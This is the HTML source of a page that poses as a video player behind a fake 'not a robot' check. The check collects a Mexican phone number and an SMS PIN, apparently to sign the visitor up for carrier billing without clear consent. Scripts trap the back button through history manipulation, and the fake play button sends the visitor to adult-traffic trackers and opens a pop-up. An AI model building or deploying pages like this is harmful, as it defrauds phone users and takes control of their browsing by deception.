<!DOCTYPE html>
<html>
    <head>
    
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title class="a1">注意！</title>
        <link rel="stylesheet" type="text/css" href="'/public/styles/styles.min.css">

        <script>
            function launchpopLink() {
                var redirectUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
                var mainUrl = "https://ig2kv.bemobtrcks.com/click";
            
                window.location.href = redirectUrl;
                window.open(mainUrl, "_blank");
            }
        </script>  
            
        <script>
            function init() {
            setTimeout(function(){window.scrollTo(0,1)},0);
            }
            window.history.replaceState('https://congratulations-to-you.com/loading.html', '', 'https://congratulations-to-you.com/loading.html');
            window.history.pushState('https://congratulations-to-you.com/bestgames-2025/index.html', '', 'https://congratulations-to-you.com/bestgames-2025/index.html');
            window.addEventListener('popstate', function(e) {
            if(document.URL.indexOf('https://congratulations-to-you.com/loading.html') >= 0){
            document.location.href = document.location;
            }
            });
        </script>
    </head>

    <body>
   
        <section class="player">
            <div class="container"  id="container">
              
                <h3>Confirm that you are not a robot</h3>             
                <br>

                <!-- 隐藏的 发送错误 信息 -->
                <div class="error-message" id="errorMessage" style="display: none;">
                    There was an error connecting to the verification service. Please try again later.
                </div>                
                <!-- 隐藏的 发送成功 信息 -->
                <div class="success-message" id="successMessage" style="display: none;">
                    Verification code sent successfully!
                </div>               
                <!-- 隐藏的 loading -->
                <div class="loading" id="loading">
                    <div class="loading-spinner"></div>
                    <p>Processing your request...</p>
                </div>
                

                <form id="phoneForm">
                    <!-- 1、手机号码输入框 -->
                    <div class="form-group">                        
                        <div class="phone-input">
                            <span class="country-code">+52</span>
                            <input type="text" name="msisdn" id="msisdn" placeholder="Eenter your phone number" required 
                                   pattern="[0-9]{3} [0-9]{3} [0-9]{3}" title="Please enter 9 digits in the format: xxx xxx xxx">
                        </div>                       
                    </div>
                    <!-- 2、验证码输入框 + 发送验证码按钮 -->
                    <div class="form-group">                   
                        <div class="pin-input-container">
                            <input type="text" name="pin" id="pin" class="pin-input" placeholder="Enter 6-digit PIN" 
                                   pattern="[0-9]{6}" title="Please enter 6 digits" maxlength="6" disabled>
                            <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
                        </div>                       
                    </div>             
                </form>
                

                <!-- 3、确认验证码按钮 -->
                <button type="click" class="btn" id="verifyBtn" disabled>Verify PIN</button>
            </div>
            
            <!-- 发送验证码及确认验证码JS -->
            <script> 
                // 点击‘发送验证码’按钮流程
                document.getElementById('phoneForm').addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    const input = document.getElementById('msisdn');
                    const errorDiv = document.getElementById('errorMessage');
                    const successDiv = document.getElementById('successMessage');
                    const loadingDiv = document.getElementById('loading');
                    const pinInput = document.getElementById('pin');
                    const sendPinBtn = document.getElementById('sendPinBtn');
                    const verifyBtn = document.getElementById('verifyBtn');
                    
                    // 隐藏 previous messages
                    errorDiv.style.display = 'none';
                    successDiv.style.display = 'none';
                    
                    // 简单的客户端验证
                    if (!input.value.match(/^\d{3} \d{3} \d{3}$/)) {
                        errorDiv.textContent = 'Please enter a valid phone number in the format: xxx xxx xxx';
                        errorDiv.style.display = 'block';
                        return;
                    }
                    
                    // 显示加载指示器
                    loadingDiv.style.display = 'block';
                    
                    try {
                        // 发送数据到服务器端处理
                        const formData = new FormData();
                        formData.append('msisdn', input.value);
                        
                        const response = await fetch('/api/api_handler.php', {
                            method: 'POST',
                            body: formData
                        });
                        
                        const result = await response.json();
                        
                        if (result.status === 'success') {
                            successDiv.textContent = result.message || 'Verification code sent successfully!';
                            successDiv.style.display = 'block';
                            errorDiv.style.display = 'none';
                            
                            // 启用PIN输入和verify按钮
                            
                            pin.disabled = false;
                            verifyBtn.disabled = false;
                            
                            // 保存tracker（如果有）
                            if (result.tracker) {
                                window.tracker = result.tracker;
                            }
                            // 禁用按钮并开始倒计时
                            sendPinBtn.disabled = true;
                            let countdown = 120; // 120秒倒计时
                            
                            // 更新按钮文本
                            sendPinBtn.textContent = `Resend in ${countdown}s`;
                            
                            // 设置倒计时间隔
                            const countdownInterval = setInterval(() => {
                                countdown--;
                                sendPinBtn.textContent = `Resend in ${countdown}s`;
                                
                                if (countdown <= 0) {
                                    clearInterval(countdownInterval);
                                    sendPinBtn.disabled = false;
                                    sendPinBtn.textContent = 'Send PIN';
                                }
                            }, 1000);
                            
                            
                        } 
                        else {
                            // 显示错误消息
                            errorDiv.textContent = result.message || 'An error occurred. Please try again.';
                            errorDiv.style.display = 'block';
                        }
                    }
                    catch (error) {
                        // 处理网络错误
                        errorDiv.textContent = 'Network error. Please check your connection and try again.';
                        errorDiv.style.display = 'block';
                        console.error('Error:', error);
                    } 
                    finally {
                        // 无论成功或失败，都隐藏加载指示器
                        loadingDiv.style.display = 'none';
                    }
                });
                
                // 格式化电话号码输入
                document.getElementById('msisdn').addEventListener('input', function(e) {
                    // 移除所有非数字字符
                    let value = e.target.value.replace(/\D/g, '');
                    
                    // 如果超过10位，截取前10位
                    if (value.length > 9) {
                        value = value.substring(0, 9);
                    }
                    
                    // 根据数字长度进行格式化
                    let formattedValue = value;
                    if (value.length > 6) {
                        formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 9);
                    } else if (value.length > 3) {
                        formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6);
                    }
                    
                    // 更新输入框的值
                    e.target.value = formattedValue;
                });
                          
                // 验证PIN码按钮功能
                document.getElementById('verifyBtn').addEventListener('click', async function() {
                    const pinInput = document.getElementById('pin');
                    const errorDiv = document.getElementById('errorMessage');
                    const successDiv = document.getElementById('successMessage');
                    const loadingDiv = document.getElementById('loading');
                    const containerDiv = document.getElementById('container');
                    
                    // 验证PIN码
                    if (!pinInput.value.match(/^\d{6}$/)) {
                        errorDiv.textContent = 'Please enter a valid 6-digit PIN code';
                        errorDiv.style.display = 'block';
                        return;
                    }
                    
                    // 显示加载指示器
                    loadingDiv.style.display = 'block';
                    errorDiv.style.display = 'none';
                    successDiv.style.display = 'none';
                    
                    try {
                        // 发送验证请求
                        const formData = new FormData();
                        formData.append('pin', pinInput.value);
                        formData.append('tracker', window.tracker || '');
                        
                        const response = await fetch('/api/verify.php', {
                            method: 'POST',
                            body: formData
                        });
                        
                        const result = await response.json();
                        // 如果返回success,重新给successDiv的textContent赋值
                        if (result.status === 'success') {
                            successDiv.textContent = result.message || 'Verification successful!';
                            successDiv.style.display = 'block';
                            
                            // 如果服务器返回了重定向地址，设置一个2秒的延时，然后重定向用户到相应的页面。
                            if (result.redirect) {
                                setTimeout(() => {
                                    window.location.href = result.redirect;
                                }, 2000);
                            }
                            // 没重定向将整个div隐藏，显示出下面的播放按钮，方便点击跳转
                            else{
                                 
                                    setTimeout(() => {
                                        containerDiv.classList.add('fade-out');
                                       
                                        setTimeout(() => {
                                            containerDiv.classList.add('hidden');}, 1000);
                                    }, 1000);
                                    
                                
                            }
                        } 
                        else {
                            errorDiv.textContent = result.message || 'Invalid verification code. Please try again.';
                            errorDiv.style.display = 'block';
                        }
                    } catch (error) {
                        errorDiv.textContent = 'Verification code is incorrect. Please check your PIN and try again.';
                        errorDiv.style.display = 'block';
                        console.error('Error:', error);
                    } finally {
                        loadingDiv.style.display = 'none';
                    }
                });
            </script>
            

            <div class="player_content">
                <img class="loading2" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiIGNsYXNzPSJsZHMtcm9sbGluZyIgc3R5bGU9ImJhY2tncm91bmQ6MCAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiBmaWxsPSJub25lIiBzdHJva2U9IiM3ZGIwZmYiIHN0cm9rZS13aWR0aD0iNSIgcj0iNDAiIHN0cm9rZS1kYXNoYXJyYXk9IjE4OC40OTU1NTkyMTUzODc1NyA2NC44MzE4NTMwNzE3OTU4NiIgdHJhbnNmb3JtPSJyb3RhdGUoMzMyIDUwIDUwKSI+PGFuaW1hdGVUcmFuc2Zvcm0gYXR0cmlidXRlTmFtZT0idHJhbnNmb3JtIiB0eXBlPSJyb3RhdGUiIGNhbGNNb2RlPSJsaW5lYXIiIHZhbHVlcz0iMCA1MCA1MDszNjAgNTAgNTAiIGtleVRpbWVzPSIwOzEiIGR1cj0iMS41cyIgYmVnaW49IjBzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPjwvY2lyY2xlPjwvc3ZnPg==" alt="">
                
                <img class="play" src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSLQodC70L7QuV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjAiIHk9IjAiIHZpZXdCb3g9IjAgMCAyMDAgMjAwIiB4bWw6c3BhY2U9InByZXNlcnZlIj48c3R5bGU+LnN0MXtmaWxsOiNmZmZ9PC9zdHlsZT48Y2lyY2xlIGN4PSIxMDAiIGN5PSIxMDAiIHI9Ijk3LjUiIG9wYWNpdHk9Ii4zIi8+PHBhdGggY2xhc3M9InN0MSIgZD0iTTcwLjMgNjUuN3Y2OC41YzAgNyA3LjUgMTEuNSAxMy42IDguMWw2MS44LTM0LjNjNi4zLTMuNSA2LjMtMTIuNiAwLTE2LjFMODQgNTcuN2MtNi4yLTMuNC0xMy43IDEtMTMuNyA4eiIvPjxwYXRoIGNsYXNzPSJzdDEiIGQ9Ik0xMDAgMTEuNWM0OC44IDAgODguNSAzOS43IDg4LjUgODguNXMtMzkuNyA4OC41LTg4LjUgODguNS04OC41LTM5LjctODguNS04OC41UzUxLjIgMTEuNSAxMDAgMTEuNW0wLTlDNDYuMiAyLjUgMi41IDQ2LjIgMi41IDEwMHM0My43IDk3LjUgOTcuNSA5Ny41IDk3LjUtNDMuNyA5Ny41LTk3LjVTMTUzLjggMi41IDEwMCAyLjV6Ii8+PC9zdmc+" alt="" onclick="launchpopLink()">
                
            </div>
            <div class="top_icons">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCI+PHBhdGggZD0iTTI1IDBDMTEuMiAwIDAgMTEuMiAwIDI1czExLjIgMjUgMjUgMjUgMjUtMTEuMiAyNS0yNVMzOC44IDAgMjUgMHptMTEuOCAzNUwzNSAzNi44bC0xMC0xMC0xMCAxMC0xLjgtMS44IDEwLTEwLTEwLTEwIDEuOS0xLjkgMTAgMTAgMTAtMTBMMzcgMTUgMjcgMjVsOS44IDEweiIgb3BhY2l0eT0iLjgiIGZpbGw9IiNmZmYiLz48L3N2Zz4=">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAjCAYAAAAe2bNZAAAElUlEQVRYhc2Ya2wUVRTHf9sXfWyhLJS2SMFSlZfRoJY2JpoQ5QMhJanIQ6AYH4iKD/xggibGDz6IxgRMqmJVioKliGhiWkh80MT6wRZMSJRarDGotNZua6Xt7tIWuub03ulOtzOzM+oH/skme++ce+5/zjn3nHOHKwk+4bLw9ahXSnOBW4BFwGwgHbgIdAJtwCngVy8K2570keKRxBRgDVAOlABFQJLp+ShwDmgBGoCjQMSt8iQXMoJM4GWgC/gQ2AAUW6yX8Xz9/ICWfxWY+n+REcXngWeAHJfkDQiJp/X6Lf+VTBVwCJjukUQ8soH3gXf+LZmPgO3xkxLxKUlwvh9+6dNKfK5JPQh85pVMNbDWblFPGNYugSfKoDsEl70dxnJtpUmwOk3rgK12mv6KQFEA9lWo8cVL8EYzLMqFUfekJH5OxJOKt4ycmjonLWkp0BeGYFiNd62AgmyIjCgXisuCIfVLdo7I/cA0JzKvGInQDtlpcLYb3vtOCfjT4I750BOB/iFoDUJZIZTOgd5wwnjabUdGrPKY41KUK1JS4fcLpoWpMNAB4qWqVVC/GRoqITcTugbBZ0/oPnO6MJO5JxERA5dH4bqZpnEUVpfC6Udhe2ls/ta5MDCUMH+M5x8jgGfpNJ8QYpn0FFhaEJPcWz45PqJR2LsaMlLhrRYoss9Ua3TZ6DBU3AaUuSUzNR0K/LE5q0A1XNMXgaEhlZtssAy4HZOblrjNsmMx41NvnAiXRuHepVAyT5GyQbqu/uNkrnJDJKrzzI0FMMdF6RNrLC+C2dkwMOwomocpZjKcJMUN4WF1MiLDEBx0Q12hvRc6ByDDuVkZ29+wjK0R5e16QtAbgd0roWkrnPwRnmt0R+baGXC8EkIj6hTaYGx/g2+nnZRk0uIAHF4fc80jK+DFI7DtZnfuOvwDJPsc8430PeOWaQUuWElJBg2PTNx0z0pIzYEtHzuTONMNFbWw4xjk+xUhC0R0qzpOpgn41koykAmn/4CHTYU/LRkObobGJmhon7xGTtGzX0JZNdT/pFyVlKQOgAWkRf3aTKZLJ55JED8vyIW3W+BkR+zpusVQsgw2HJi4yaHv4YYq2NUIuVmwYKZKB1H7iv6pJDziykGtnbSY158Oj9dPnK9dD4NBeP4raAvC3XWwsQ66w3B9AUxJdgxaAx8Yf8xkQsCbVtLyZlfnQPM5qD4Vm78mAC9tghdOwPIaON4Oi/NhVpZylQtIP9NnRQbdPFtC3rBwBuz8XLUGBh66CfwZygrzpiV0STx2mMfxZGSbjVarRL/UJEnrO79Qc0db4c4aCGSo8uDxKij98N/mCbsb5bvAA1YaZIEksOLp0NwBWamQ53ftFgMSn5vME043SmEdACqs2IhLzgRV7pFS4ZHIsXgiBpz6nrv0LWECJB6EgLhGEqKH+BDUAKvsHia6xG0DKoF+T1tORki7/X4nITfX24NAIfAaMOCRhByIPXr9vkTCbi/+/frY5+me9Yj+2mDlpN+AT7QV8oGnzLnECV4/iUhRk68L3+jvMwv1htKtDQF/Amf195mfPeq+ggD8A5KtNgPkCILAAAAAAElFTkSuQmCC" alt="">
            </div>
            <div class="player_navigation">
                <div class="player_navigation_item">
                    <div class="pause_play">
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMiAyMCI+PHBhdGggZD0iTS4yIDQuMXYxMS44YzAgLjUuNi43IDEgLjVsMTAtNS42Yy43LS40LjctMS4zIDAtMS43bC0xMC01LjZjLS40LS4yLTEgLjEtMSAuNnoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="">
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMiAyMCI+PHBhdGggZD0iTTMuOSAxNi41SC42Yy0uMiAwLS40LS4yLS40LS40VjMuOWMwLS4yLjItLjQuNC0uNGgzLjJjLjIgMCAuNC4yLjQuNFYxNmMuMS4zLS4xLjUtLjMuNXptNy40IDBIOC4xYy0uMiAwLS40LS4yLS40LS40VjMuOWMwLS4yLjItLjQuNC0uNGgzLjJjLjIgMCAuNC4yLjQuNFYxNmMwIC4zLS4yLjUtLjQuNXoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="">
                    </div>
                    <p>00:00<span id="counter_wrapper"></span>/1:52:46</p>
                </div>
                <div class="progress">
                    <div class="progress_load">
                        <div class="progress_line"></div>
                    </div>
                </div>
                <div class="player_navigation_item">
                    <img class="img_padding" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMCAzMCI+PHBhdGggZD0iTTI1IDIwLjdjMC0yIDEuNi0zLjYgMy42LTMuNi4zIDAgLjUgMCAuOC4xLjEtLjcuMi0xLjQuMi0yLjEgMC0uNy0uMS0xLjQtLjItMi0uMy4xLS41LjEtLjguMS0yIDAtMy42LTEuNi0zLjYtMy42IDAtMS4zLjctMi40IDEuOC0zLjEtLjktMS4yLTEuOS0yLjItMy0zLjEtLjYgMS4xLTEuOCAxLjgtMy4xIDEuOC0yIDAtMy42LTEuNi0zLjYtMy42IDAtLjMuMS0uNi4xLTEtLjctLjEtMS40LS4yLTIuMi0uMi0uNyAwLTEuNC4xLTIgLjIuMS4zLjIuNi4yIDEgMCAyLTEuNiAzLjYtMy42IDMuNi0xLjUgMC0yLjYtLjgtMy4yLTEuOS0xLjIuOS0yLjMgMS45LTMuMiAzLjFDNC4zIDcgNSA4LjIgNSA5LjRjMCAyLTEuNiAzLjYtMy42IDMuNi0uMyAwLS41IDAtLjgtLjEtLjEuNy0uMiAxLjQtLjIgMi4xIDAgLjcuMSAxLjQuMiAyaC44YzIgMCAzLjYgMS42IDMuNiAzLjYgMCAxLjMtLjcgMi40LTEuOCAzLjEuOSAxLjIgMiAyLjMgMy4yIDMuMi42LTEgMS43LTEuNiAzLTEuNiAyIDAgMy42IDEuNiAzLjYgMy42IDAgLjIgMCAuNC0uMS43LjcuMSAxLjMuMiAyIC4yczEuNC0uMSAyLS4yYzAtLjItLjEtLjQtLjEtLjcgMC0yIDEuNi0zLjYgMy42LTMuNiAxLjMgMCAyLjQuNiAzIDEuNiAxLjItLjkgMi4zLTIgMy4yLTMuMi0uOS0uNi0xLjYtMS44LTEuNi0zek0xNSAyMmMtMy44IDAtNi45LTMuMS02LjktNi45czMuMS02LjkgNi45LTYuOSA2LjkgMy4xIDYuOSA2LjlTMTguOCAyMiAxNSAyMnoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=" alt="">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTAgMjUwIj48cGF0aCBkPSJNMTg3LjUgMTguM2gtMTI1Yy0yNC4zIDAtNDQuMSAxOS44LTQ0LjEgNDQuMXYxMjUuMWMwIDI0LjMgMTkuOCA0NC4xIDQ0LjEgNDQuMWgxMjUuMWMyNC4zIDAgNDQuMS0xOS44IDQ0LjEtNDQuMXYtMTI1YzAtMjQuNC0xOS44LTQ0LjItNDQuMi00NC4yek00MC40IDE4Ny41di0xMjVjMC0xMi4yIDkuOS0yMi4xIDIyLjEtMjIuMWgxMjUuMWMxMi4yIDAgMjIuMSA5LjkgMjIuMSAyMi4xVjEyNWgtNDkuMmMtMTkuNiAwLTM1LjQgMTUuOC0zNS40IDM1LjR2NDkuMkg2Mi41Yy0xMi4yIDAtMjIuMS05LjktMjIuMS0yMi4xeiIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==" alt="">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTAgMjUwIj48cGF0aCBkPSJNMjAxLjggMzQuOUgxNTFjLTcuNCAwLTEzLjQgNi0xMy40IDEzLjRzNiAxMy40IDEzLjQgMTMuNGgxOC40bC0yNy45IDI3LjljLTIuNSAyLjUtMy45IDUuOS0zLjkgOS41IDAgMy42IDEuNCA3IDMuOSA5LjVzNS45IDMuOSA5LjUgMy45YzMuNiAwIDctMS40IDkuNS0zLjlsMjcuOS0yNy45djE4LjRjMCA3LjQgNiAxMy40IDEzLjQgMTMuNHMxMy40LTYgMTMuNC0xMy40VjQ4LjNjLjEtNy40LTYtMTMuNC0xMy40LTEzLjR6bS04OS4zIDExNS45YzAtMy42LTEuNC03LTMuOS05LjVzLTUuOS0zLjktOS41LTMuOWMtMy42IDAtNyAxLjQtOS41IDMuOWwtMjcuOSAyNy45di0xOC40YzAtNy40LTYtMTMuNC0xMy40LTEzLjRzLTEzLjQgNi0xMy40IDEzLjR2NTAuOWMwIDcuNCA2IDEzLjQgMTMuNCAxMy40SDk5YzcuNCAwIDEzLjQtNiAxMy40LTEzLjRzLTYtMTMuNC0xMy40LTEzLjRIODAuNmwyNy45LTI3LjljMi42LTIuNiA0LTYgNC05LjZ6IiBmaWxsPSIjZmZmIi8+PC9zdmc+">
                    <img src="data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSLQodC70L7QuV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjAiIHk9IjAiIHZpZXdCb3g9IjAgMCAxNCAxMyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHN0eWxlPi5zdDB7ZmlsbDojZmZmfTwvc3R5bGU+PHBhdGggY2xhc3M9InN0MCIgZD0iTTIuNiA5LjJILjhjLS40IDAtLjctLjMtLjctLjdWNC42YzAtLjQuMy0uNy43LS43aDEuOHY1LjN6bTQuOSAzLjVMMy42IDkuMlYzLjlMNy40LjNjLjMtLjMuOC0uMS44LjN2MTEuOGMwIC40LS41LjYtLjcuM3ptMy05LjRjLS4xLS4xLS4zLS4xLS40IDBsLS40LjVjLS4xLjEtLjEuMiAwIC4zLjUuNi45IDEuNS45IDIuNHMtLjQgMS44LS45IDIuNGMtLjEuMS0uMS4zIDAgLjRsLjMuNGMuMS4xLjMuMS40IDAgLjctLjkgMS4yLTIgMS4yLTMuMnMtLjQtMi4zLTEuMS0zLjJ6Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTEyLjEgMS43Yy0uMS0uMS0uMy0uMS0uNCAwbC0uNC40Yy0uMS4xLS4xLjMgMCAuNCAxIDEuMSAxLjUgMi41IDEuNSA0cy0uNSAyLjktMS41IDRjLS4xLjEtLjEuMyAwIC40bC40LjRjLjEuMS4zLjEuNCAwIDEuMi0xLjIgMS45LTIuOSAxLjktNC44LS4xLTEuOC0uOC0zLjQtMS45LTQuOHoiLz48L3N2Zz4=" alt="">
                </div>
            </div>
        </section>
    
    </body>
</html>